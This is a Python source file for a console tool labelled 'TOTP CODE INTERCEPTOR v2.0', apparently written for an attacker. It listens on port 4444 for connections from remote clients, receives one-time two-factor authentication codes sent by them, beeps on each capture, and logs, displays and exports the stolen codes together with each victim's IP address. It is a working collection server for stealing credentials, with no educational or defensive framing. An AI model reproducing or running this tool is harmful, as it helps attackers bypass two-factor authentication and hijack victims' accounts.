import socket
import threading
import time
import datetime
import os
import sys
import winsound  # Windows-specific sound alerts

try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init()  # Initialize colorama for Windows
    COLOR_SUPPORT = True
except ImportError:
    # Fallback if colorama is not installed
    class DummyFore:
        def __getattr__(self, name):
            return ""
    class DummyStyle:
        def __getattr__(self, name):
            return ""
    Fore = DummyFore()
    Style = DummyStyle()
    COLOR_SUPPORT = False

# Attacker listener setup
SERVER_IP = "0.0.0.0"  # Listen on all interfaces
SERVER_PORT = 4444

# Create directories for logs and data
LOG_DIR = "captured_codes"
os.makedirs(LOG_DIR, exist_ok=True)

# Dictionary to store potential TOTP codes with timestamps
captured_totps = {}

# Flag to indicate if we're in live monitoring mode
live_monitor_mode = False
live_monitor_thread = None

def play_alert_sound():
    """Play a sound when a TOTP code is captured"""
    try:
        # Frequency and duration for the beep sound
        winsound.Beep(1000, 200)  # 1000 Hz for 200 ms
        time.sleep(0.1)
        winsound.Beep(1500, 200)  # 1500 Hz for 200 ms
    except:
        pass  # Silently fail if sound can't be played

def handle_client(client_socket, client_address):
    """Handle communication with a connected client"""
    global captured_totps, live_monitor_mode
    
    print(f"{Fore.GREEN}[+] Connection from {client_address[0]}:{client_address[1]}{Style.RESET_ALL}")
    
    buffer = ""
    
    try:
        while True:
            # Receive data
            data = client_socket.recv(1024).decode('utf-8', errors='ignore')
            if not data:
                break
                
            buffer += data
            
            # Process complete messages (if any)
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                
                if line.startswith("TOTP:"):
                    # Extract potential TOTP code
                    code = line[5:].strip()
                    if code and code.isdigit():
                        process_totp_code(code, client_address[0])
                
    except Exception as e:
        print(f"{Fore.RED}[-] Error handling client {client_address[0]}: {e}{Style.RESET_ALL}")
    finally:
        client_socket.close()
        print(f"{Fore.YELLOW}[-] Client {client_address[0]} disconnected{Style.RESET_ALL}")

def process_totp_code(code, client_ip):
    """Process a captured TOTP code"""
    global captured_totps, live_monitor_mode
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Play alert sound
    play_alert_sound()
    
    # Store in our dictionary with timestamp for later use
    captured_totps[code] = {
        "timestamp": timestamp,
        "client": client_ip,
        "used": False
    }
    
    # Write to a log file for persistence
    log_file_path = os.path.join(LOG_DIR, f"captured_totps_{datetime.datetime.now().strftime('%Y%m%d')}.log")
    with open(log_file_path, "a") as log_file:
        log_file.write(f"{timestamp} | {client_ip} | {code}\n")
    
    # If we're in live monitor mode, show the code immediately
    if live_monitor_mode:
        print(f"\n{Fore.RED}[!] LIVE CAPTURE: {Fore.WHITE}{code} {Fore.YELLOW}from {client_ip} at {timestamp}{Style.RESET_ALL}")
    else:
        # Standard notification
        show_totp_notification(code, timestamp, client_ip)

def show_totp_notification(code, timestamp, client_ip):
    """Show a notification about a captured TOTP code"""
    print("\n" + "=" * 50)
    print(f"{Fore.RED}[!] TOTP CODE CAPTURED!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Code:{Fore.WHITE} {code}")
    print(f"{Fore.YELLOW}Time:{Fore.WHITE} {timestamp}")
    print(f"{Fore.YELLOW}From:{Fore.WHITE} {client_ip}")
    print("=" * 50)

def clear_screen():
    """Clear the console screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Display a banner for the attacker tool"""
    if COLOR_SUPPORT:
        banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗
║ {Fore.RED}████████╗ ██████╗ ████████╗██████╗   {Fore.CYAN}██╗███╗   ██╗████████╗{Fore.CYAN} ║
║ {Fore.RED}╚══██╔══╝██╔═══██╗╚══██╔══╝██╔══██╗  {Fore.CYAN}██║████╗  ██║╚══██╔══╝{Fore.CYAN} ║
║ {Fore.RED}   ██║   ██║   ██║   ██║   ██████╔╝  {Fore.CYAN}██║██╔██╗ ██║   ██║   {Fore.CYAN} ║
║ {Fore.RED}   ██║   ██║   ██║   ██║   ██╔═══╝   {Fore.CYAN}██║██║╚██╗██║   ██║   {Fore.CYAN} ║
║ {Fore.RED}   ██║   ╚██████╔╝   ██║   ██║       {Fore.CYAN}██║██║ ╚████║   ██║   {Fore.CYAN} ║
║ {Fore.RED}   ╚═╝    ╚═════╝    ╚═╝   ╚═╝       {Fore.CYAN}╚═╝╚═╝  ╚═══╝   ╚═╝   {Fore.CYAN} ║
╠═══════════════════════════════════════════════════════════╣
║ {Fore.YELLOW}             TOTP CODE INTERCEPTOR v2.0              {Fore.CYAN} ║
╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
    else:
        banner = """
=================================================================
|                     TOTP CODE INTERCEPTOR v2.0                |
=================================================================
        """
    print(banner)

def live_monitor():
    """Live monitoring function for TOTP codes"""
    global live_monitor_mode
    
    clear_screen()
    print(f"{Fore.YELLOW}[*] LIVE MONITORING MODE ACTIVE{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Waiting for TOTP codes...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Press Ctrl+C to return to menu{Style.RESET_ALL}")
    
    try:
        live_monitor_mode = True
        
        while live_monitor_mode:
            time.sleep(0.1)  # Check frequently but don't hog CPU
            
    except KeyboardInterrupt:
        live_monitor_mode = False
        return

def display_menu():
    """Display an interactive menu for the attacker"""
    global live_monitor_mode, live_monitor_thread
    
    while True:
        clear_screen()
        display_banner()
        
        print(f"\n{Fore.CYAN}==== TOTP Interceptor Menu ===={Style.RESET_ALL}")
        print(f"{Fore.WHITE}1. Show all captured TOTPs")
        print(f"2. Show most recent TOTPs (last 5 minutes)")
        print(f"3. Start LIVE monitoring")
        print(f"4. Clear captured TOTPs")
        print(f"5. Export captured TOTPs to file")
        print(f"6. Exit{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.GREEN}Select an option: {Style.RESET_ALL}")
        
        if choice == "1":
            if captured_totps:
                print(f"\n{Fore.YELLOW}--- All Captured TOTPs ---{Style.RESET_ALL}")
                for code, details in captured_totps.items():
                    print(f"{Fore.GREEN}Code: {Fore.WHITE}{code} {Fore.GREEN}| Time: {Fore.WHITE}{details['timestamp']} {Fore.GREEN}| Client: {Fore.WHITE}{details['client']}{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.RED}No TOTPs captured yet.{Style.RESET_ALL}")
            
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
                
        elif choice == "2":
            recent_found = False
            current_time = datetime.datetime.now()
            
            print(f"\n{Fore.YELLOW}--- Recent TOTPs (Last 5 minutes) ---{Style.RESET_ALL}")
            for code, details in captured_totps.items():
                # Parse the timestamp
                code_time = datetime.datetime.strptime(details['timestamp'], "%Y-%m-%d %H:%M:%S")
                
                # Check if it's within the last 5 minutes
                time_diff = (current_time - code_time).total_seconds() / 60
                if time_diff <= 5:
                    print(f"{Fore.GREEN}Code: {Fore.WHITE}{code} {Fore.GREEN}| Time: {Fore.WHITE}{details['timestamp']} {Fore.GREEN}| Client: {Fore.WHITE}{details['client']}{Style.RESET_ALL}")
                    recent_found = True
            
            if not recent_found:
                print(f"{Fore.RED}No recent TOTPs captured.{Style.RESET_ALL}")
            
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        
        elif choice == "3":
            # Start live monitoring in this thread
            live_monitor()
                
        elif choice == "4":
            captured_totps.clear()
            print(f"\n{Fore.GREEN}All captured TOTPs cleared.{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "5":
            if captured_totps:
                filename = f"totp_export_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, "w") as f:
                    f.write("TOTP Codes Export\n")
                    f.write("=================\n\n")
                    f.write("Code | Timestamp | Client IP\n")
                    f.write("--------------------------\n")
                    for code, details in captured_totps.items():
                        f.write(f"{code} | {details['timestamp']} | {details['client']}\n")
                print(f"\n{Fore.GREEN}TOTPs exported to {filename}{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.RED}No TOTPs to export.{Style.RESET_ALL}")
            
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "6":
            clear_screen()
            print(f"{Fore.YELLOW}Exiting TOTP Interceptor...{Style.RESET_ALL}")
            break
            
        else:
            print(f"\n{Fore.RED}Invalid option. Please try again.{Style.RESET_ALL}")
            time.sleep(1)

def start_server():
    """Start the listening server for incoming connections"""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((SERVER_IP, SERVER_PORT))
        server_socket.listen(5)
        print(f"{Fore.GREEN}[+] Listening for connections on {SERVER_IP}:{SERVER_PORT}{Style.RESET_ALL}")
        
        while True:
            client_socket, client_address = server_socket.accept()
            client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_handler.daemon = True
            client_handler.start()
            
    except Exception as e:
        print(f"{Fore.RED}[-] Server error: {e}{Style.RESET_ALL}")
        sys.exit(1)
    finally:
        server_socket.close()

if __name__ == "__main__":
    try:
        # Start the server in a separate thread
        server_thread = threading.Thread(target=start_server)
        server_thread.daemon = True
        server_thread.start()
        
        # Display the interactive menu
        time.sleep(1)  # Give server time to start
        display_menu()
        
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}[*] Shutting down TOTP Interceptor...{Style.RESET_ALL}")
        sys.exit(0)
